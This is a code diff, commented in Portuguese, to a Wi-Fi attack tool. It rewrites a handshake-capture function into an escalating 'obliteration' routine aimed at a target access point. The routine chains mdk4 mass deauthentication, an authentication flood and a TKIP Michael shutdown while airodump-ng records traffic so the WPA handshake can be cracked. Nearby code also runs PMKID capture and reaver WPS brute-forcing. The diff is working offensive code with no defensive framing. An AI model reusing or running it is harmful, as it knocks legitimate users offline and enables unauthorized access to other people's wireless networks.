@@ -200,18 +200,73 @@ def capture_pmkid(monitor_interface, bssid, channel, output_file, params=None):
     return None
 
 def capture_handshake(monitor_interface, bssid, channel, output_file, params=None):
-    cap_file = f"{output_file}-01.cap"; handshake_found = False
-    for attempt in range(1, 4):
-        deauth_cmd = f"sudo aireplay-ng -0 10 -a {bssid} {monitor_interface}"
-        deauth_proc = subprocess.Popen(deauth_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        for _ in range(30):
-            time.sleep(1)
-            if os.path.exists(cap_file) and os.path.getsize(cap_file) > 24:
-                stdout, _ = run_command(f"aircrack-ng -q {cap_file}")
-                if stdout and ("1 handshake" in stdout or "WPA (1 handshake)" in stdout): handshake_found = True; break
-        deauth_proc.terminate(); run_command("killall mdk4", sudo=True)
-        if handshake_found: break
-    return cap_file if handshake_found else None
+    """ Vetor Y: Obliteração Absoluta (Ataque Multi-Camada MDK4 + Airodump) """
+    supreme_log(f"VETOR OBLITERAÇÃO INICIADO EM {bssid} [CH: {channel}]...", log_type="cmd")
+    
+    # Fixa o canal
+    run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
+    
+    # Prepara arquivos
+    run_command(f"rm -f {output_file}-01.*", sudo=True)
+    cap_file = f"{output_file}-01.cap"
+    
+    # 1. Inicia o Airodump-ng em background para apenas "escutar e gravar" o tráfego do alvo
+    cmd_airodump = f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_file} --output-format pcap {monitor_interface}"
+    airodump_proc = subprocess.Popen(cmd_airodump, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    
+    handshake_found = False
+    escalation_level = 1
+    
+    # Loop de obliteração de 120 segundos (Ataques escalonados)
+    for i in range(12):
+        if escalation_level == 1:
+            supreme_log("NÍVEL 1: Deauth Massivo (Amok Mode) via mdk4...", log_type="cmd")
+            # MDK4 Deauth Mode (Desconecta todo mundo brutalmente)
+            cmd_mdk = f"sudo mdk4 {monitor_interface} d -B {bssid} -c {channel}"
+            mdk_proc = subprocess.Popen(cmd_mdk, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            time.sleep(10)
+            mdk_proc.terminate()
+            escalation_level = 2
+            
+        elif escalation_level == 2:
+            supreme_log("NÍVEL 2: Sobrecarga de Autenticação (Auth DoS) para travar roteador...", log_type="cmd")
+            # MDK4 Auth Mode (Cria milhares de clientes falsos, forçando o roteador a derrubar os reais)
+            cmd_mdk = f"sudo mdk4 {monitor_interface} a -a {bssid} -m"
+            mdk_proc = subprocess.Popen(cmd_mdk, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            time.sleep(10)
+            mdk_proc.terminate()
+            escalation_level = 3
+            
+        elif escalation_level == 3:
+            supreme_log("NÍVEL 3: WPA Downgrade (Michael Shutdown Exploitation)...", log_type="cmd")
+            # MDK4 WPA Downgrade (Força o AP a desligar o Wi-Fi por 1 minuto por 'segurança')
+            cmd_mdk = f"sudo mdk4 {monitor_interface} m -t {bssid}"
+            mdk_proc = subprocess.Popen(cmd_mdk, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            time.sleep(10)
+            mdk_proc.terminate()
+            escalation_level = 1 # Volta pro nível 1
+            
+        # Verificação Contínua a cada ciclo de 10s
+        run_command("sudo killall mdk4 2>/dev/null") # Garante limpeza de zumbis
+        
+        if os.path.exists(cap_file) and os.path.getsize(cap_file) > 2000: # Se o ficheiro tem tráfego real
+            stdout, _ = run_command(f"aircrack-ng -q {cap_file}")
+            if stdout and ("1 handshake" in stdout or "WPA (1 handshake)" in stdout):
+                supreme_log("!!! SUCESSO ABSOLUTO: Handshake EAPOL capturado durante a obliteração!", log_type="info")
+                handshake_found = True
+                break
+                
+    # Finaliza a escuta
+    airodump_proc.terminate()
+    run_command("sudo killall airodump-ng mdk4 2>/dev/null")
+    
+    if handshake_found:
+        return cap_file
+    else:
+        supreme_log("FALHA: O roteador resistiu aos 3 níveis de DoS (Provavelmente PMF estrito ou ausência total de clientes reais ativos).", log_type="error")
+        # Se falhou, elimina o lixo para não poluir a pasta e falsificar quebras
+        os.remove(cap_file)
+        return None
 
 def capture_wps(monitor_interface, bssid, channel, params=None):
     cmd = f"sudo reaver -i {monitor_interface} -b {bssid} -c {channel} -K 1 -vv -f"
